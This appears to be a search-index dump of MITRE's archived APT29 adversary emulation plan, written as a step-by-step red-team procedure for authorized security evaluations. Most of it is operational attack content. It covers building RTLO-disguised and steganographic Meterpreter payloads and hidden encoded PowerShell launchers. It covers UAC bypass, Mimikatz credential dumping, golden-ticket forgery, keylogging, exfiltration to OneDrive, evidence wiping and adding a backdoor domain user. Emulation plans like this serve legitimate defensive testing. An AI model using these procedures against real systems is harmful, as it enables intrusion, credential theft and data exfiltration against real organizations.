Staged private key used for Get-PrivateKey discovery.","File-Collection.ps1: PowerShell script to collect the following:","Get-Screenshot.ps1: PowerShell Empire Script script to take screenshots.","Invoke-BypassUACTokenManipulation.ps1: PowerShell Empire script to bypass UAC.","Invoke-Mimikatz.ps1: PowerShell Empire PowerShell script to execute Mimikatz.","Invoke-PSInject.ps1: PowerShell Empire PowerShell script to execute base64 encoded PowerShell code.","invoke-winrmsession.ps1: PoshC2 script to create winrm sessions.","login","m.exe: Mimikatz executable.","make_lnk.ps1: Payload generation script to create masqumasquerading .lnk file","MITRE-ATTACK-EVALS.HTML: Staged .html only used for Discovery.","Modified-SysInternalsSuite.zip: Utilities used in persistence mechanisms that are stored within a SysInternals directory.","monkey.png: Stenography png with encoded payload.","Note, none of the utilities here are actually Windows SysInternals tools. The SysInternals is downloaded from Microsoft during Day-1 A execution.","pass","powerview.ps1: Powerview functions to execute reflective loading.","ps.ps1: Process enumeration.","psw","rar.exe: Archive utility.","sandcat.go-windows-upx: UPX packed Sandcat binary.","sandcat.go-windows: Sandcat binary.","schemas.ps1: Payload generation script using alternate data streams.","setup.py: Setup utility to update all payloads with appropriate IP:PORT.","sifer","sifr","StealToken.ps1: Steal a process' token.","stepFifteen_wmi.ps1: WMI persistence.","stepFourteen_bypassUAC.ps1: UAC bypass via sdclt.exe.","stepFourteen_credDump.ps1: WMI Based credential dump.","stepSeventeen_email.ps1: Outlook e-mail enumeration.","stepSeventeen_zip.ps1: Zip up a directory.","stepSixteen_SID.ps1: Get SID of user.","stepThirteen.ps1: Discovery functions.","stepTwelve.ps1: Detect AntiVirus.","timestomp.ps1: Timestomp a file.","update.ps1: Update sandcat payload.","upload.ps1: CALDERA upload utility.","wipe.ps1: Reflectivly load sdelete64.exe."]}],[{"i":"emulation-plan-archived","l":"Emulation Plan (ARCHIVED)","p":["Please see the formal APT29 emulation document, which includes a break-down of the cited intelligence used for each step of this emulation.","The Evaluations emulation is split into two distinct scenarios (Days 1 and 2) to reflect these differing operational flows and toolkits used by APT29.","APT Operation Flow"]},{"l":"Day 1","p":["Based on CosmicDuke ATT&CK S0050, MiniDuke ATT&CK S0051, SeaDuke/SeaDaddy ATT&CK S0053, CozyDuke/CozyCar ATT&CK S0046, and HAMMERTOSS ATT&CK S0037","This scenario begins with a legitimate user clicking on a malicious payload delivered via a âspray and prayâ broad spearphishing. campaign. The attacker immediately kicks off a âsmash-and-grabâ, rapid espionage mission, gathering and exfiltrating data. After initial exfiltration, the attacker realizes the value of victim and subsequently deploys a stealthier toolkit, changing TTPsâ and eventually moving laterally through the rest of the environment. The scenario ends with the execution of previously established persistence mechanisms are executed.","This content to execute this scenario was tested and developed using Pupy, Meterpreter, and other custom/modified scripts and payloads. Pupy and Meterpreter were chosen based on their available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]},{"l":"Day 2","p":["Based on PowerDuke ATT&CK S0139, POSHSPY ATT&CK S0150, CloudDuke ATT&CK S0054, and more recent (2016+) TTPs","This scenario begins with a legitimate user clicking on a malicious payload delivered via a targeted spearphishingâ campaign. The attacker employs a low and slow, methodical approachâ to owning the initial target, establishing persistence, gathering credential materialsâ, then finally enumerating and owning the entire domainâ. Data exfiltration is dumped to a public cloud storageâ. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","This content to execute this scenario was tested and developed using PoshC2 and other custom/modified scripts and payloads. PoshC2 was chosen based on its available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"i":"apt29-day-1-steps-1-through-10-archived","l":"APT29 Day 1 (Steps 1 through 10) (ARCHIVED)"},{"l":"Acknowledgments"},{"l":"Special thanks to the following public resources","p":["Metasploit ( https://github.com/rapid7/metasploit-framework)","Pupy ( https://github.com/n1nj4sec/pupy)","Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage)","Microsoft Sysinternals ( https://docs.microsoft.com/en-us/sysinternals/)"]},{"l":"Overview","p":["Emulation of APT29 usage of tools such as CosmicDuke, MiniDuke, SeaDuke/SeadDaddy, CozyDuke/CozyCar, and Hammertoss","Scenario begins after delivery of a reverse shell payload via opportunistic, widespread phishing","\"Smash-and-grab\" style collection and exfiltration before deciding the target may be of future value and deploying stealthier malware for long term exploitation","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Requirements"},{"l":"Victim systems","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined","Same local administrator account on both Windows workstations","Google Chrome Web Browser ( https://www.google.com/chrome/) must be available on one of the victim workstations"]},{"l":"Red Team Systems","p":["Attack Platform: tested and executed on Ubuntu 18.04.3 LTS","Pupy RAT ( https://github.com/n1nj4sec/pupy)","Metasploit Framework ( https://github.com/rapid7/metasploit-framework)","Chrome Password Dumper ( https://github.com/adnan-alhomssi/chrome-passwords)","Sysinternals Suite Zip file ( https://download.sysinternals.com/files/SysinternalsSuite.zip)","WebDAV Share serving from /var/www/webdav ( https://www.digitalocean.com/community/tutorials/how-to-configure-webdav-access-with-apache-on-ubuntu-14-04)","Redirector: tested and executed on Ubuntu 18.04.3 LTS","socat ( https://linux.die.net/man/1/socat)","Windows Attack Platform: Windows 10 x64 version 1903","Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage)","Python 3 ( https://www.python.org/downloads/)","PyInstaller ( https://www.pyinstaller.org/)","Note: The Windows attack platform is only required if you would like to compile the Day 1 payloads. If you use the pre-compiled payloads, you do not need this system."]},{"l":"Red Team Setup","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Attack Platform","192.168.0.4","Redirector","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes four payloads that model APT29 malware.","The payloads are customized variants of reverse shells from Pupy RAT and Metasploit.","Pre-compiled payloads are available in the payloads directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.","If you would like to build the payloads yourself, please see payload_configs.md for further instructions."]},{"i":"setup-redirector-19216805-or-the-value-used-for-the-redirector-ip","l":"Setup Redirector: 192.168.0.5 (or the value used for the Redirector IP)","p":["From the redirector system, setup port forwarding using Socat"]},{"i":"setup-attack-platform-19216804","l":"Setup Attack Platform: 192.168.0.4","p":["Download Chrome password dumper tool from: https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe","Download SysInternals zip folder from: https://download.sysinternals.com/files/SysinternalsSuite.zip","Unzip SysinternalsSuite.zip; copy the following files into the SysInternalsSuite directory:","readme.txt","psversion.txt","chrome-passwords.exe(renamed as accessChk.exe)","strings64.exe(compiled from hostui.cpp)","Zip modified SysinternalsSuite folder","Install Pupy and Metasploit on Attack Platform by running install_day1_tools.sh","Start Pupy docker container then the EC4 listener","sudo pupy/start-compose.sh","listen -a ec4"]},{"l":"Victim Setup"},{"l":"For each of the 2 victim workstations","p":["Login in as user with administrator privileges","Ensure Windows Defender is off or configured to alert-only","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Verify user has read/write/execute permissions in the C:\\Windows\\Temp directory","Install Google Chrome ( https://www.google.com/chrome/); cache credentials in Chrome password manager","Import-PFX certificate found in payloads/shockwave.local.pfx, instructions below"]},{"l":"Import PFX Certificate","p":["Step 6.B of this emulation models theft of Private Keys ( https://attack.mitre.org/techniques/T1145/).","Copy the PFX certificate located in the payloads/shockwave.local.pfx directory to the Windows victims.","Import the certificate using PowerShell:"]},{"i":"add-rtlo-character-and-place-rcs3aka3doc-on-windows-victim-1","l":"Add RTLO character and place rcs.3aka3.doc on Windows Victim-1","p":["See payload_configs.md for instructions on how to update cod.3aka3.scr"]},{"l":"Beginning of Day1 Execution"},{"i":"step-1---initial-breach","l":"Step 1 - Initial Breach"},{"i":"1a","l":"1.A","p":["Login to victim workstation.","Double click 3aka3.doc on Desktop","This will send a reverse shell to the Pupy C2 server."]},{"i":"1b","l":"1.B","p":["From Pupy C2 server:","[pupy] > shell","[pupy (CMD)] > powershell"]},{"i":"step-2---rapid-collection-and-exfiltration","l":"Step 2 - Rapid Collection and Exfiltration"},{"i":"2a","l":"2.A","p":["Paste the following PowerShell 1-liner into the Pupy terminal:","[pupy (PowerShell)] >","[pupy (PowerShell)] > exit","[pupy (CMD)] > exit"]},{"i":"2b","l":"2.B","p":["[pupy] > download C:\\Users\\username\\AppData\\Roaming\\Draft.Zip ."]},{"i":"step-3---deploy-stealth-toolkit","l":"Step 3 - Deploy Stealth Toolkit"},{"i":"3a","l":"3.A","p":["Start Metasploit handler:","[msf] > handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https","From Pupy, upload monkey.png to target:","[pupy] > upload /tmp/monkey.png C:\\Users\\username\\Downloads\\monkey.png[pupy] > shell[pupy CMD] > powershell"]},{"i":"3b","l":"3.B","p":["[pupy (PowerShell)] >","Paste the following 1-liner when prompted for value:","When prompted for value, press: [Enter]","[pupy (PowerShell)] > exit[pupy (CMD)] > %windir%\\system32\\sdclt.exe[pupy CMD] > powershell","You should receive a high integrity Meterpreter callback."]},{"i":"3c","l":"3.C","p":["[pupy (PowerShell)] > Remove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force[pupy (PowerShell)] > exit[pupy (CMD)] > exit"]},{"i":"step-4---defense-evasion-and-discovery","l":"Step 4 - Defense Evasion and Discovery"},{"i":"4a","l":"4.A","p":["From Metasploit:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >","[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite\\"]},{"i":"4b","l":"4.B","p":["Terminate Pupy RAT process:","[meterpreter (PowerShell)*] > Get-Process","[meterpreter (PowerShell)*] > Stop-Process -Id rcs.3aka3.doc PID -Force","You may now close Pupy.","From Metasploit:","[meterpreter (PowerShell)*] > Gci $env:userprofile\\Desktop","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Desktop\\?rcs.3aka.doc","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:APPDATA\\Draft.Zip","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Downloads\\SysinternalsSuite.zip","Import custom script, readme.ps1:","[meterpreter (PowerShell)*] > Move-Item .\\readme.txt readme.ps1","[meterpreter (PowerShell)*] > . .\\readme.ps1"]},{"i":"4c","l":"4.C","p":["[meterpreter (PowerShell)*] > Invoke-Discovery"]},{"i":"step-5---persistence","l":"Step 5 - Persistence"},{"i":"5a","l":"5.A","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 1"]},{"i":"5b","l":"5.B","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 2"]},{"i":"step-6---credential-access","l":"Step 6 - Credential Access"},{"i":"6a","l":"6.A","p":["Execute chrome-password collector:","[meterpreter (PowerShell)*] > C:\\Program Files\\SysinternalsSuite\\accesschk.exe"]},{"i":"6b","l":"6.B","p":["Steal PFX certificate:","[meterpreter (PowerShell)*] > Get-PrivateKeys","[meterpreter (PowerShell)*] > exit"]},{"i":"6c","l":"6.C","p":["Dump password hashes:","[meterpreter*] > run post/windows/gather/credentials/credential_collector"]},{"i":"step-7---collection-and-exfiltration","l":"Step 7 - Collection and Exfiltration"},{"i":"7a","l":"7.A","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite","[meterpreter (PowerShell)*] > Move-Item .\\psversion.txt psversion.ps1","[meterpreter (PowerShell)*] > . .\\psversion.ps1","[meterpreter (PowerShell)*] > Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName Screenshot","From the Windows victim, type text and copy to the clipboard.","[meterpreter (PowerShell)*] > Get-Clipboard","[meterpreter (PowerShell)*] > Keystroke-Check","[meterpreter (PowerShell)*] > Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName Keystrokes","From victim system, enter keystrokes.","View keylog output from Metasploit:","[meterpreter (PowerShell)*] > View-Job -JobName Keystrokes[meterpreter (PowerShell)*] > Remove-Job -Name Keystrokes -Force[meterpreter (PowerShell)*] > Remove-Job -Name Screenshot -Force"]},{"i":"7b","l":"7.B","p":["[meterpreter (PowerShell)*] > Invoke-Exfil"]},{"i":"step-8---lateral-movement","l":"Step 8 - Lateral Movement"},{"i":"8a","l":"8.A","p":["Copy payload to webdav share:","[user@attacker]# cp attack-evals/apt29/day1/payloads/python.exe /var/www/webdav/[user@attacker]# cd /var/www/webdav[user@attacker]# chown -R www-data:www-data python.exe","Switch back to Meterpreter shell:","[meterpreter (PowerShell)*] > Ad-Search Computer Name *","[meterpreter (PowerShell)*] >","Note the session ID for step 8C."]},{"i":"8b","l":"8.B","p":["Start a new instance of Metasploit, and spawn a Metasploit handler:","[bash] > msfconsole","[msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https","Return to current Meterpreter session:","[meterpreter (PowerShell)*] > Invoke-SeaDukeStage -ComputerName victim 2 IP"]},{"i":"8c","l":"8.C","p":["Execute SEADUKE Remotely via PSEXEC","[meterpreter (PowerShell)*] >","You should receive a callback in your other Metasploit terminal."]},{"i":"step-9---collection","l":"Step 9 - Collection"},{"i":"9a","l":"9.A","p":["From the second Metasploit terminal:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >"]},{"i":"9b","l":"9.B","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Windows\\Temp","[meterpreter (PowerShell)*] > .\\Rar.exe a -hpfGzq5yKw $env:USERPROFILE\\Desktop\\working.zip $env:APPDATA\\working.zip","[meterpreter (PowerShell)*] > exit","[meterpreter*] > download C:\\\\Users\\\\username\\\\Desktop\\\\working.zip ."]},{"i":"9c","l":"9.C","p":["[meterpreter*] > shell","[meterpreter (Shell)*] > cd C:\\Windows\\Temp","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Windows\\Temp\\Rar.exe","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\AppData\\Roaming\\working.zip","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\Desktop\\working.zip","[meterpreter (Shell)*] > del C:\\Windows\\Temp\\sdelete64.exe","Terminate Session[meterpreter (Shell)*] > exit[meterpreter*] > exit msf> exit"]},{"i":"step-10---persistence-execution","l":"Step 10 - Persistence Execution"},{"i":"10a","l":"10.A","p":["Reboot Windows victim 1; wait for system to boot up","You should receive a callback with SYSTEM permissions from the javamtsup service"]},{"i":"10b","l":"10.B","p":["Trigger the Startup Folder persistence by logging in to Windows victim 1"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Payload configs"},{"l":"Create Day 1 Payloads"},{"i":"1-cosmicduke-payload-cod3aka3scr","l":"1. CosmicDuke Payload (cod.3aka3.scr)","p":["alt text","cod.3aka3.scr","Description","Filename","Generate a Pupy-EC4 callback payload:","Location","Move cursor to beginning of filename. Press \"ctrl-v\" to paste RTLO character, and hit \"enter\" to save the rename.","On Windows attack platform, rename cod.3aka3.scr with right-to-left override character ( https://redcanary.com/blog/right-to-left-override/)","payloads/cod.3aka3.scr","Portable executable that uses right-to-left override character to disguise file extension","Right click cod.3aka3.scr, then click \"Rename\"","Screenshot taken from: https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/","Scroll to the RTLO character (U+202E)","Select the RTLO character, then click \"select\", then click \"copy\"","The file should now be named \"rcs.3aka3.doc\"","Windows key and type 'Character Map'; select open"]},{"i":"2-privilege-escalation-payload-monkeypng","l":"2. Privilege Escalation Payload (monkey.png)","p":["Filename","Location","Description","monkey.png","payloads/monkey.png","Well formed PNG with embedded PowerShell-Meterpreter callback","Steps to re-create:","Generate a PowerShell-formatted Meterpreter payload:","Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage):"]},{"i":"3-startup-folder-payload-strings64hostuiexe","l":"3. Startup Folder Payload (strings64/hostui.exe)","p":["Filename","Location","Description","strings64.exe","payloads/SysinternalsSuite/strings64.exe","Launches Meterpreter using CreateProcessWithToken API call","Generate PowerShell-formatted Meterpreter:","Copy the PowerShell 1-liner to clipboard. Your clipboard should look like:","powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa=","Do not copy the execution preamble (%COMSPEC% /b /c start /b /min)","Open payloads/readme.txt; paste the PowerShell-Meterpreter blog on line 816. This line should look like:","$javasvc = powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa="]},{"i":"4-persistent-service-payload-javamtsupexe","l":"4. Persistent Service Payload (javamtsup.exe)","p":["Filename","Location","Description","javamtsup.exe","payloads/SysinternalsSuite/javamtsup.exe","Reverse HTTPS Meterpreter service executable","Generate a Meterpreter service-binary:"]},{"i":"5-seaduke-payload-pythonexe","l":"5. SeaDuke Payload (python.exe)","p":["Filename","Location","Description","python.exe","payloads/Seaduke/python.exe","Python Meterpreter compiled to EXE with PyInstaller","Generate python-formatted Meterpreter:","Transfer python.py to Windows attack platform","Compile python.py into a portable executable using PyInstaller ( https://pypi.org/project/PyInstaller/)","Pack the python.exe payload using UPX ( https://github.com/upx/upx)"]}],[{"i":"apt29-day-2-steps-11-through-20-archived","l":"APT29 Day 2 (Steps 11 through 20) (ARCHIVED)"},{"l":"Acknowledgements"},{"l":"Special thanks to the following public resources","p":["Atomic Red Team ( https://github.com/redcanaryco/atomic-red-team)","Mimikatz ( https://github.com/gentilkiwi/mimikatz)","Pinvoke ( http://www.pinvoke.net)","PoshC2 ( https://github.com/nettitude/PoshC2)","POSHSPY ( https://github.com/matthewdunwoody/POSHSPY)","PowerSploit ( https://github.com/PowerShellMafia/PowerSploit)","PSReflect-Functions ( https://github.com/jaredcatkinson/PSReflect-Functions)","State of the Hack S2E01: #NoEasyBreach REVISITED ( https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html)","Use PowerShell to Interact with the Windows API ( https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1)","Yet another sdclt UAC bypass ( http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)"]},{"l":"Overview","p":["Emulation of APT29 usage of tools such as PowerDuke, POSHSPY, CloudDuke, as well as more recent (2016+) TTPs","Scenario begins with a target spearphishing leading into a low and slow, methodical approach to owning the initial target and eventually the entire domain","Includes establishing persistence, credential gathering, local and remote enumeration, and data exfil","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Requirements"},{"l":"Victim Systems","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined with at least 2 accounts (domain admin and another user)","Microsoft Outlook must be available locally on one of the victim workstations"]},{"l":"Red Team Systems","p":["Server running an offensive framework (we tested and executed using PoshC2 -- https://github.com/nettitude/PoshC2) capable of:","Executing native PowerShell commands","Loading and executing PowerShell scripts (.ps1)","Generating a DLL payload and an encoded PowerShell oneliner","Receiving and maintaining multiple callbacks at once","Online OneDrive Account ( https://onedrive.live.com/)"]},{"l":"Red Team Setup"},{"i":"generate-an-encoded-powershell-oneliner-payload-then-copy","l":"Generate an encoded PowerShell oneliner payload, then copy","p":["Just the encoded portion (ex: WwBTAH...=) into $enc_ps variable(4th line from bottom) in schemas.ps1","ex: $enc_ps = WwBTAH...==","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into CommandLineTemplate variable (under $ConsumerArgs in 2nd paragraph) in stepFifteen_wmi.ps1","ex: CommandLineTemplate=powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into -Value variable (2nd line) in stepFourteen_bypassUAC.ps1","ex: New-Item -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command -Value powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="]},{"i":"generate-dll-payload-then-on-a-separate-windows-host","l":"Generate DLL payload, then on a separate Windows host","p":["[CMD] > certutil -encode [file].dll blob","[CMD] > powershell","[PS] > $blob = (Get-Content .\\blob) -join ; $blob .\\blob","Open blob file in text editor","Delete new line at end of file and copy all (CTRL-A, CTRL-C)","Paste value (ex: -----BEGIN CERTIFICATE-----...-----END CERTIFICATE-----) into $bin variable (6th line) in schemas.ps1"]},{"i":"copy-payloads-to-c2-server-wherever-is-appropriate-for-your-c2-framework-to-have-access-to-these-files","l":"Copy payloads to C2 server (wherever is appropriate for your C2 framework to have access to these files)"},{"i":"update-stepfourteen_creddumpps1----directions-are-in-file","l":"Update stepFourteen_credDump.ps1 -- directions are in file"},{"l":"Prepare initial access payloads","p":["Login as non-domain admin user","Copy over the following files onto the Desktop of the initial victim:","2016_United_States_presidential_election_-_Wikipedia.html","make_lnk.ps1","schemas.ps1","Copy over MITRE-ATTACK-EVALS.HTML into the Documents folder of the initial victim","Execute make_lnk.ps1(Right click > Run with PowerShell), this will generate 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk","Drag make_lnk.ps1 and schemas.ps1 to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)"]},{"l":"Victim Setup"},{"l":"For each of the 3 victims","p":["Login in as domain admin user","Ensure Windows Defender is off or configured to alert-only ( https://support.microsoft.com/en-us/help/4027187/windows-10-turn-off-antivirus-protection-windows-security)","Change network type to Domain ( https://www.itechtics.com/change-network-type-windows-10/#2-_Setting_network_type_using_Windows_Registry)","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Enable WinRM ( https://support.microsoft.com/en-us/help/555966)","Enable UseLogonCredential in the WDigest Registry settings ( https://support.microsoft.com/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)"]},{"i":"for-the-initial-victim-the-workstation-with-microsoft-outlook","l":"For the initial victim (the workstation with Microsoft Outlook)","p":["Login as non-domain admin user","Enable programatic access to Microsoft Outlook ( https://www.slipstick.com/developer/change-programmatic-access-options/)","Open Outlook and sign in if necessary"]},{"l":"Beginning of Day2 Execution"},{"i":"step-11---initial-breach","l":"Step 11 - Initial Breach"},{"i":"11a","l":"11.A","p":["As non-domain admin user, execute 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk(double click), output will display in terminal","You will now receive a new, low integrity callback"]},{"i":"step-12---fortify-access","l":"Step 12 - Fortify Access"},{"i":"12a","l":"12.A","p":["Load timestomp.ps1","Execute timestomp C:\\Users\\oscar\\AppData\\Roaming\\Microsoft\\kxwn.lock"]},{"i":"12b","l":"12.B","p":["Load stepTwelve.ps1","Execute detectav"]},{"i":"12c","l":"12.C","p":["Execute software"]},{"i":"step-13---local-enumeration","l":"Step 13 - Local Enumeration"},{"i":"13a","l":"13.A","p":["Load stepThirteen.ps1","Execute comp"]},{"i":"13b","l":"13.B","p":["Execute domain"]},{"i":"13c","l":"13.C","p":["Execute user"]},{"i":"13d","l":"13.D","p":["Execute pslist"]},{"i":"step-14---elevation","l":"Step 14 - Elevation"},{"i":"14a","l":"14.A","p":["Load stepFourteen_bypassUAC.ps1","Execute bypass","You will now receive a new, high integrity callback"]},{"i":"14b","l":"14.B","p":["Go to where m.exe is on C2 server in another terminal","Confirm m.exe is there and is a Windows PE ($ file m)","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Host file on port 8080 ($ sudo python -m SimpleHTTPServer 8080)","Interact with new callback","Load stepFourteen_credDump.ps1","Execute wmidump","Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)"]},{"i":"step-15---establish-persistence","l":"Step 15 - Establish Persistence"},{"i":"15a","l":"15.A","p":["Load stepFifteen_wmi.ps1","Execute wmi","Note: Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20"]},{"i":"step-16---lateral-movement","l":"Step 16 - Lateral Movement"},{"i":"16a","l":"16.A","p":["Interact with low integrity callback","Load powerView.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)","Execute get-netdomaincontroller"]},{"i":"16b","l":"16.B","p":["Load stepSixteen_SID.ps1","Execute siduser","Save the value for the domain SID (ex: S-1-5-21-2219224806-3979921203-557828661-1110) and delete the RID (ex: -1110) of the end (ex: S-1-5-21-2219224806-3979921203-557828661)"]},{"i":"16c","l":"16.C","p":["Interact with high integrity callback","Load Invoke-WinRMSession.ps1(available at https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1)","Execute invoke-winrmsession -Username [insert domain admin username] -Password [insert domain admin password] -IPAddress [insert domain controller IP]","Output will tell you a session opened and give you the format for using it, ex: Session opened, to run a command do the following: Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string","Save the value for the session_id (ex: $hzaqx)","Note: If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C"]},{"i":"16d","l":"16.D","p":["Execute Copy-Item m.exe -Destination C:\\Windows\\System32\\ -ToSession $[session_id]","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Execute Invoke-Command -Session $[session_id] -scriptblock {C:\\Windows\\System32\\m.exe privilege::debug lsadump::lsa /inject /name:krbtgt exit} | out-string","Take note of value for the NTLM hash (ex: NTLM : f4a688010d80770a55a22893dc6ac510) near the top (Under RID and User after * Primary)","Execute Get-PSSession | Remove-PSSession"]},{"i":"step-17---collection","l":"Step 17 - Collection"},{"i":"17a","l":"17.A","p":["Interact with low integrity callback","Load stepSeventeen_email.ps1","Execute psemail"]},{"i":"17b","l":"17.B","p":["Interact with high integrity callback","Execute New-Item -Path C:\\Windows\\Temp\\ -Name WindowsParentalControlMigration -ItemType directory","Execute Copy-Item C:\\Users\\oscar\\Documents\\MITRE-ATTACK-EVALS.HTML -Destination C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"17c","l":"17.C","p":["Load stepSeventeen_zip.ps1","Execute zip C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"step-18---exfiltration","l":"Step 18 - Exfiltration"},{"i":"18a","l":"18.A","p":["Get CID for OneDrive account ( https://www.laptopmag.com/articles/map-onedrive-network-drive)","Execute net use y: https://d.docs.live.net/[CID] /user:[OneDrive account]@outlook.com [OneDrive password]","Execute Copy-Item C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp -Destination Y:\\WindowsParentalControlMigration.tmp","Login to https://onedrive.live.com/?id=rootcid=[CID] to see exfil ( WindowsParentalControlMigration.tmp)"]},{"i":"step-19---clean-up","l":"Step 19 - Clean UP"},{"i":"19a","l":"19.A","p":["Load wipe.ps1","Execute wipe C:\\Windows\\System32\\m.exe","Note: There's a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang"]},{"i":"19b","l":"19.B","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp"]},{"i":"19c","l":"19.C","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML"]},{"i":"step-20---leverage-persistence","l":"Step 20 - Leverage Persistence"},{"i":"20a","l":"20.A","p":["Execute restart-computer -force","Existing 2 callbacks should die","RDP and login to initial victim once it reboots","Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)","Note: You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire"]},{"i":"20b","l":"20.B","p":["Interact with the SYSTEM PS callback (from WMI)","Execute klist purge","Load Invoke-Mimikatz.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)","Execute invoke-mimikatz -command 'kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:mscott /ptt' using the SID and NTLM values from earlier","Execute klist and confirm ticket is in cache","Execute Enter-PSSession [hostname of second workstation in domain]","Execute Invoke-Command -ComputerName [hostname of second workstation in domain] -ScriptBlock {net user /add toby pamBeesly3}"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE 